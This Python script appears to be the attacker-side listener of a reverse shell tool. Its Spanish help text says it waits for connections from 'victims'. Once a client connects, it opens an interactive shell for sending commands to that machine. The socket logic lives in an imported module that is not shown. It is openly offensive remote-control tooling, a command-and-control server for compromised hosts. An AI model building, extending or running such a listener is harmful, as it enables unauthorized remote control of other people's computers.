from errno import EADDRINUSE

from socket_server import SocketServer, ClientCloseSocket
import sys
import argparse
import readline

# define the args


parser = argparse.ArgumentParser(
    description="Este script esperara las conexiones de las victimas")
parser.add_argument("-d", "--direction", default="localhost",
                    help="Dirección de escucha")
parser.add_argument("-p", "--port", required=True, type=int,
                    help="Puerto de escucha."
                         "Los puertos útiles son del 1024 al 49152")
parser.add_argument("-t", "--time_recv", type=int, default=None,
                    help="Tiempo de espera EN SEGUNDOS para obtener el resultado "
                         "de un comando enviando a un cliente, si se excede"
                         " el tiempo especificado, el programa se detiene."
                         "Por defecto se espera indefinidamente.")
parser.add_argument("-c", "--time_connect", type=int, default=None,
                    help="Tiempo de espera EN SEGUNDOS de conexión con algún "
                         "cliente, si este excede el tiempo especificado, "
                         "el programa se detiene."
                         "Por defecto espera indefinidamente.")
argParser = parser.parse_args()


def verify_args():
    if not (1024 < argParser.port < 49151) \
            or (argParser.time_recv is not None and argParser.time_recv < 0) \
            or (argParser.time_connect is not None and argParser.time_connect < 0):
        parser.print_help(sys.stderr)
        parser.exit()


if __name__ == "__main__":
    verify_args()
    try:
        socketServer = SocketServer(
            direction=argParser.direction,
            port=argParser.port,
            time_out_response=argParser.time_recv,
            connect_time_out=argParser.time_connect
        )
        socketServer.run_server()
        socketServer.enable_interactive_shell()
    except KeyboardInterrupt:
        print("\nSe forzó el cierre del servidor")
    except ClientCloseSocket as e:
        print("El cliente cerro el socket, finalizando...")
    except TimeoutError:
        print("El tiempo de espera para la conexión del socket fue superado")
    except OSError as e:
        if e.errno == EADDRINUSE:
            print("La dirección ya esta ocupada por un programa")
            print("Puede ejecutar lo siguiente para ver que proceso ocupa ese puerto")
            print("sudo lsof -i:{}".format(argParser.port))
    except Exception as e:
        print("Excepción no controlada", e)
